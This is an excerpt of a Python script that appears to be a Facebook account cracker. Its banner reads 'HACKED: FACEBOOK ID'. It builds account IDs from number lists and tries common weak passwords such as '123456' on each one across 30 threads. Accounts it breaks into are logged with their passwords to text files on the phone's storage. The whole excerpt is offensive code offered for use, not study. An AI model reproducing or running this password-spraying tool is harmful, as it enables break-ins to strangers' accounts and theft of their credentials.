...
logo ="""
	...
	/____/___/_/|_/\___/\____/_/|_/    
     ...
     │ [+] WHATSAPP : +880××××--××××        │
     │ [+] VERSION  : Test                  │
     │ [+] HACKED   : \033[1;37m FACEBOOK ID \033[1;37m         │
     └───────────────────────────────────────┘"""
loop,ok=0,0
class Hacker:
    ...
    def settings(self):
       ...
       with tred(max_workers=30) as kidz:
           ...
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789','1234567890']
    ...
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r[+] Loading...%s  OK ID: %s "%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(f"\r\r[+] OK ID:\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Lincon-old-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(f"\r\r[+] CP ID:\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Lincon-old-CP.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
